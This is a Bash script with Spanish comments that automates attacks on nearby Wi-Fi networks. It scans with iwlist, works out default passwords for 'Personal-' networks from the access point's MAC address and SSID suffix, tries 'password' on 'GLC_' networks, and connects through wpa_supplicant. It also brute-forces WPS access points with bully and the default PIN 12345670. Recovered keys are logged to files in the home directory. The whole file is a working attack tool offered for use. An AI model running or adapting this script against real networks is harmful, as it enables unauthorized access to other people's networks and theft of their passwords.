#/bin/bash

# --- Colores para la salida ---
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[93m"
BLUE="\e[34m"
BOLD="\e[1m"
RESET="\e[0m"

INTERVALO=5
INTERFACE=$1
TOPSENIAL=-75
DELAY=10s

TMP="/tmp/redes.txt"

# Verificar si el script se ejecuta con privilegios de root
if [ "$EUID" -ne 0 ]; then
	echo -e "\n${RED}[ERROR]${RESET} Este script debe ejecutarse con sudo o como root.${RESET}"
	exit 1
fi

# Chequeo de dependencias
REQUIRED_CMDS=(iw iwlist wpa_passphrase wpa_supplicant timeout bully pkill awk sed grep ip)
declare -A PKG_MAP=(
  [iw]=iw
  [iwlist]=wireless-tools
  [wpa_passphrase]=wpa-supplicant
  [wpa_supplicant]=wpa-supplicant
  [timeout]=coreutils
  [bully]=bully
  [pkill]=procps
  [awk]=gawk
  [sed]=sed
  [grep]=grep
  [ip]=iproute2
)

MISSING=()
PKGS=()
for CMD in "${REQUIRED_CMDS[@]}"; do
  if ! command -v "$CMD" >/dev/null 2>&1; then
    MISSING+=("$CMD")
    PKG="${PKG_MAP[$CMD]:-$CMD}"
    # evitar duplicados en PKGS
    case " ${PKGS[*]} " in
      *" $PKG "*) ;;
      *) PKGS+=("$PKG") ;;
    esac
  fi
done

if [ "${#MISSING[@]}" -ne 0 ]; then
  echo -e "\n[ERROR] Faltan dependencias: ${MISSING[*]}"
  echo "Instálalas en Debian/Ubuntu con:"
  echo "sudo apt-get update && sudo apt-get install -y ${PKGS[*]}"
  exit 1
fi

# Chequeo de dependencias


trap cleanup INT

uso() {
	echo -e "\n${YELLOW}Uso:${RESET} $0 <INTERFACE>"
	echo -e "\nEjemplo: $0 wlan0"
	exit 1
}




modomanager() {
	 ip link set "$INTERFACE" down 2>/dev/null
	 iw dev "$INTERFACE" set type managed
	 ip link set "$INTERFACE" up 2>/dev/null
}

modomonitor() {
	 ip link set "$INTERFACE" down 2>/dev/null
	 iw "$INTERFACE" set monitor control
	 ip link set "$INTERFACE" up 2>/dev/null
}

cleanup() {
	if [ ! -z "$SPINNER_PID" ]; then
		kill "$SPINNER_PID" 2>/dev/null
	fi

	exit 1
}

banner() {
	echo -e "${BLUE}${BOLD}"
	echo -e "============================================"
	echo -e "   Wifi User, Pass y WPS Default"
	echo -e "============================================"
	echo -e "${RESET}\n"
}

spinner() {

	local CHARS=("\\" "|" "/" "-")
	local SPINNER_DELAY=0.1
	local I=0

	while true; do
		local INDEX=$((I % 4))
		local CHAR=${CHARS[$INDEX]}
		printf "\rProcesando... %s" "$CHAR"
		I=$((I + 1))
		sleep $SPINNER_DELAY
	done
}

es_mac_valida() {
	local MAC="$1"
	[[ "$MAC" =~ ^([A-Fa-f0-9]{2}:){5}[A-Fa-f0-9]{2}$ ]] && [[ "$MAC" != "00:00:00:00:00:00" ]]
}

if [ $# -ne 1 ]; then
	uso
fi



# Determina la interfaz inalámbrica por defecto si no se pasa como parámetro
#if [ -z "$INTERFACE" ]; then
#	INTERFACE=$(iw dev 2>/dev/null | awk '/Interface/{iface=$2} /type/{mode=$2; if(mode=="managed"){print iface}}' | head -n1)
#fi

# Validar que se encontró una interfaz
if [ ! -z "$INTERFACE" ]; then
	modomanager
else
	echo -e "${RED}[ERROR]${RESET} La interfaz ${BOLD}$INTERFACE${RESET} no existe."
	uso
	exit 1
fi

function intentoConexionWPS() {
	MAC=$3
	INTERFACE=$6
	CHAN=$4
	ESSID=$1
	PIN=$2
	SENIAL=$5

	if es_mac_valida "$MAC"; then
		echo -e "\n\n${BLUE}${BOLD}📡 Probando${RESET}: ${BOLD}${MAC}${RESET} ${BLUE}(ESSID: ${BOLD}${ESSID}${RESET}${BLUE}, Canal: ${BOLD}${CHAN}${RESET}${BLUE}, Señal: -${BOLD}${SENIAL} dBm${RESET}${BLUE})${RESET}"
	fi

	timeout $DELAY bully -b "$MAC" -B -p "$PIN" -v3 "$INTERFACE" | tee -a "/tmp/bully_output.log" | {
		TIMEOUT_COUNT=0

		while IFS= read -r LINE; do

			# Contador de timeouts
			if [[ "$LINE" == *"Tx(DeAuth) = 'Timeout'"* ]]; then
				((TIMEOUT_COUNT++))
			fi

			if [[ "$LINE" == *"Rx("*"Assn"*") = 'Timeout'"* ]]; then
				((TIMEOUT_COUNT++))
			fi

			# Errores fatales
			if [[ "$LINE" == *"WPS locked"* || "$LINE" == *"WPS transaction failed"* || "$LINE" == *"Too many failed attempts"* || "$LINE" == *"failed to associate"* ]]; then
				echo -e "\n${YELLOW}Conectarse (WPS) a ${BOLD}${ESSID}${RESET}${YELLOW} con la Clave: ${BOLD}${PIN}${RESET}${YELLOW} y MACAddress: ${BOLD}${MAC}${RESET} --> ${RED}[FALLÓ]${RESET}\n"
				echo "[$(date '+%F %T')] FAIL  | ${MAC} | ${ESSID} | ${PIN}" >>"$HOME/wifiwps-sin-password-por-defecto.txt"
				pkill -f "bully.*$MAC"
				break
			fi

			# Éxito: clave encontrada
			if [[ "$LINE" == *"key"* || "$LINE" == *"KEY"* ]]; then
				KEY=$(echo "$LINE" | cut -d"'" -f4)
				echo -e "\n${GREEN}${BOLD}[✓] PIN correcto para ${RESET}${BOLD}${MAC}${RESET}${GREEN} - PIN: ${RESET}${BOLD}${PIN}${RESET}${GREEN} - KEY: ${RESET}${BOLD}${KEY}${RESET}"
				echo -e "\n${YELLOW}Conectarse (WPS) a ${BOLD}${ESSID}${RESET}${YELLOW} con la Clave: ${RESET}${BOLD}${KEY}${RESET}${YELLOW} y MACAddress: ${RESET}${BOLD}${MAC}${RESET} --> ${GREEN}${BOLD}[OK]${RESET}\n"
				echo "[$(date '+%F %T')] OK  | ${MAC} | ${ESSID} | ${PIN}| ${KEY}" >>"$HOME/wifiwps-password-default.txt"
				pkill -f "bully.*$MAC"
				break
			fi

			# Demasiados timeouts
			if [[ $TIMEOUT_COUNT -ge 3 ]]; then

				echo -e "\n${YELLOW}Conectarse (WPS) a ${BOLD}${ESSID}${RESET}${YELLOW} con la Clave: ${BOLD}${PIN}${RESET}${YELLOW} y MACAddress: ${BOLD}${MAC}${RESET} --> ${RED}${BOLD}[FALLÓ]${RESET}\n"
				echo "[$(date '+%F %T')] FAIL  | ${MAC} | ${ESSID} | ${PIN}" >>"$HOME/wifiwps-sin-password-por-defecto.txt"
				pkill -f "bully.*$MAC"
				break
			fi

		done

	}

	if [ ! "$(grep -i "$MAC" $HOME/wifiwps-sin-password-por-defecto.txt 2>/dev/null)" ] && [ ! "$(grep -i "$MAC" $HOME/wifiwps-password-default.txt 2>/dev/null)" ]; then

		echo -e "\n${YELLOW}Conectarse (WPS) a ${BOLD}${ESSID}${RESET}${YELLOW} con la Clave: ${BOLD}${PIN}${RESET}${YELLOW} y MACAddress: ${BOLD}${MAC}${RESET} --> ${RED}${BOLD}[FALLÓ]${RESET}\n"
		echo "[$(date '+%F %T')] FAIL  | ${MAC} | ${ESSID} | ${PIN}" >>"$HOME/wifiwps-sin-password-por-defecto.txt"

	fi

	modomanager

}

function IntentoConexion() {
	SSID="$1"
	CLAVE="$2"
	MACADDRESS="$3"
	INTERF="$4"

	modomanager

	rm -f /tmp/wpa_supplicant.conf /tmp/wpa_respuesta.log 2>/dev/null

	# Generar configuración wpa_supplicant (silenciado en pantalla)
	wpa_passphrase "$SSID" "$CLAVE" | tee /tmp/wpa_supplicant.conf >/dev/null 2>&1

	# Ejecutar wpa_supplicant con timeout y guardar salida en log temporal
	timeout $DELAY wpa_supplicant -i "$INTERF" -c /tmp/wpa_supplicant.conf >/tmp/wpa_respuesta.log 2>&1 || true

	# Comprobar resultado
	if grep -qi "CTRL-EVENT-CONNECTED" /tmp/wpa_respuesta.log; then
		echo -e "\n${YELLOW}Conectarse (WPAx) a ${BOLD}${SSID}${RESET}${YELLOW} con la Clave: ${RESET}${BOLD}${CLAVE}${RESET}${YELLOW} y MACAddress: ${RESET}${BOLD}${MACADDRESS}${RESET} --> ${GREEN}${BOLD}[OK]${RESET}\n"
		echo "[$(date '+%F %T')] OK  | ${MACADDRESS} | ${SSID} | ${CLAVE}" >>"$HOME/wifi-password-default.txt"

	else
		# Determinar razón más específica (si existe)
		if grep -qi "CTRL-EVENT-AUTH-REJECT" /tmp/wpa_respuesta.log; then
			REASON_COLOR="${RED}[ERROR] Contraseña incorrecta${RESET}"
			REASON_PLAIN="ERROR: Contraseña incorrecta"
		elif grep -qi "CTRL-EVENT-NETWORK-NOT-FOUND" /tmp/wpa_respuesta.log; then
			REASON_COLOR="${RED}[ERROR] Red no encontrada${RESET}"
			REASON_PLAIN="ERROR: Red no encontrada"
		else
			REASON_COLOR="${YELLOW}[?] Estado desconocido${RESET}"
			REASON_PLAIN="WARN: Estado desconocido"
		fi

		echo -e "\n${YELLOW}Conectarse (WPAx) a ${BOLD}${SSID}${RESET}${YELLOW} con la Clave: ${BOLD}${CLAVE}${RESET}${YELLOW} y MACAddress: ${BOLD}${MACADDRESS}${RESET} --> ${RED}${BOLD}[FALLÓ]${RESET}\n"
		echo "[$(date '+%F %T')] FAIL | ${MACADDRESS} | ${SSID} | ${CLAVE} | ${REASON_PLAIN}" >>"$HOME/wifi-sin-password-por-defecto.txt"

	fi

}

function MostrarRed() {
	ESSID="$1"
	CLAVE="$2"
	MACADDRESS="$3"
	CANAL="$4"
	INTERFACE="$5"
	WPS_FOUND="$6"
	echo -e "\n"
	echo -e "${GREEN}[RESULTADO]${RESET} Red $([[ $WPS_FOUND -eq 1 ]] && echo 'WPS' || echo 'WPAx') encontrada:"
	echo -e "   SSID     : ${BOLD}$ESSID${RESET}"
	echo -e "   MacAddress : ${BOLD}$MACADDRESS${RESET}"
	echo -e "   Canal : ${BOLD}$CANAL${RESET}"
	echo -e "   Password : ${BOLD}$CLAVE${RESET}"
	echo -e "   INTERFACE  : ${BOLD}$INTERFACE${RESET}"

}

function borrarTemporales() {
	 rm /tmp/redes.txt 2>/dev/null
	 rm /tmp/bully_output.log 2>/dev/null
	 rm /tmp/wpa_respuesta.log 2>/dev/null
	 rm /tmp/wpa_supplicant.conf 2>/dev/null
}

function bloqueCompleto() {
	local BLK="$1"

	# Requisitos mínimos: Address, ESSID, Channel/Frequency
	if ! echo "$BLK" | grep -qi 'address:'; then
		return 1
	fi
	if ! echo "$BLK" | grep -qi 'essid:'; then
		return 1
	fi
	if ! (echo "$BLK" | grep -qi 'channel:' || echo "$BLK" | grep -qi 'frequency:'); then
		return 1
	fi

	if ! echo "$BLK" | egrep -qi 'ie:|unknown:|encryption key:'; then
		return 1
	fi

	return 0
}

banner
echo -e "\n${GREEN}[OK]${RESET} Interfaz detectada: ${BOLD}$INTERFACE${RESET}"

# --- Escaneo de redes WiFi ---
echo -e "\n${BLUE}[INFO]${RESET} Iniciando escaneo de redes en ${BOLD}$INTERFACE${RESET}..."

borrarTemporales

while true; do
	spinner &
	SPINNER_PID=$!

	iwlist "$INTERFACE" scan 2>/dev/null >"$TMP"

	awk '/Cell /{print ""; print $0; next} {print}' "$TMP" |

		# Leer bloque por bloque
		while IFS= read -r LINE; do
			if [[ -z "$LINE" ]]; then
				if [[ -n "$BLOQUE" ]]; then
					if bloqueCompleto "$BLOQUE"; then
						ESSID=""
						MACADDRESS=""
						SENIAL=""
						MAC=""
						CANAL=""
						SUBSSID=""
						CLAVE=""
						echo "$BLOQUE" | while read LINE; do

							ESSID=$(echo "$BLOQUE" | sed -n 's/.*ESSID:"\(.*\)".*/\1/ip' | head -n1)

							ENC=$(echo "$BLOQUE" | grep -i 'encryption key:' | head -n1 || true)

							# Detectar la línea con la dirección MAC
							if [[ "$LINE" =~ Cell\ [0-9]+\ -\ Address:\ ([A-Fa-f0-9:]{17}) ]]; then
								MACADDRESS="${BASH_REMATCH[1]}"
								MAC=$(echo "$MACADDRESS" | sed 's/://g' | awk '{print substr($0,3,7)}')
							fi

							# Detectar la línea del nivel de señal
							if [[ "$LINE" =~ Signal\ level=(-?[0-9]+) ]]; then
								SENIAL="${BASH_REMATCH[1]}"

							fi
							if [[ "$LINE" =~ Channel: ]]; then
								CANAL=$(echo "$LINE" | sed -n 's/.*Channel:\(.*\)/\1/p' | xargs)
							fi
							if [ -n "$SENIAL" ] && [ "$SENIAL" -ge "$TOPSENIAL" ]; then

								if [[ "$LINE" =~ ESSID:\"([Pp]ersonal-[^\"]+)\" ]]; then
									ESSID=$(echo $LINE | grep "ESSID: *" | awk -F: '{print $2}' | sed 's/"//g')
									SUBSSID=$(echo "$ESSID" | sed -nE 's/.*[Pp]ersonal(-wifi)?[- ]([A-Za-z0-9]{2,4}).*/\2/p')
									CLAVE=$(echo "$MAC$SUBSSID")

									if [ ! "$(grep -i "$MACADDRESS" $HOME/wifi-sin-password-por-defecto.txt 2>/dev/null)" ] && [ ! "$(grep -i "$MACADDRESS" $HOME/wifi-password-default.txt 2>/dev/null)" ]; then

										MostrarRed "$ESSID" "$CLAVE" "$MACADDRESS" "$CANAL" "$INTERFACE"

										IntentoConexion "$ESSID" "$CLAVE" "$MACADDRESS" "$INTERFACE"

									fi

								fi
								if [[ "$LINE" =~ ESSID:\"(GLC_.*)\" ]]; then
									ESSID=$(echo $LINE | grep "ESSID: *" | awk -F: '{print $2}')
									CLAVE="password"

									if [ ! "$(grep -i "$MACADDRESS" $HOME/wifi-sin-password-por-defecto.txt 2>/dev/null)" ] && [ ! "$(grep -i "$MACADDRESS" $HOME/wifi-password-default.txt 2>/dev/null)" ]; then

										MostrarRed "$ESSID" "$CLAVE" "$MACADDRESS" "$CANAL" "$INTERFACE"

										IntentoConexion "$ESSID" "$CLAVE" $MACADDRESS "$INTERFACE"

									fi

								fi
								LINE_LC=$(echo "$LINE" | tr '[:upper:]' '[:lower:]')

								ENC_LC=$(echo "$ENC" | tr '[:upper:]' '[:lower:]')

								if echo "$LINE_LC" | grep -qiE 'wps|0050f2|00:50:f2'; then
									if [[ -n "$ENC_LC" && "$ENC_LC" != *off* ]]; then
										WPS_FOUND=1
										PIN="12345670"

										if ! grep -iqF "$MACADDRESS" "$HOME/wifiwps-sin-password-por-defecto.txt" 2>/dev/null &&
											! grep -iqF "$MACADDRESS" "$HOME/wifiwps-password-default.txt" 2>/dev/null; then

											MostrarRed "$ESSID" "$PIN" "$MACADDRESS" "$CANAL" "$INTERFACE" "$WPS_FOUND"
											modomonitor
											intentoConexionWPS "$ESSID" "$PIN" "$MACADDRESS" "$CANAL" "$SENIAL" "$INTERFACE"
											WPS_FOUND=0
										fi
									fi
								fi
							fi

						done
					fi
					BLOQUE=""
				fi
			else
				# acumular línea en el bloque actual
				BLOQUE+="$LINE"$'\n'
			fi
		done < <(cat)

	sleep 1

done
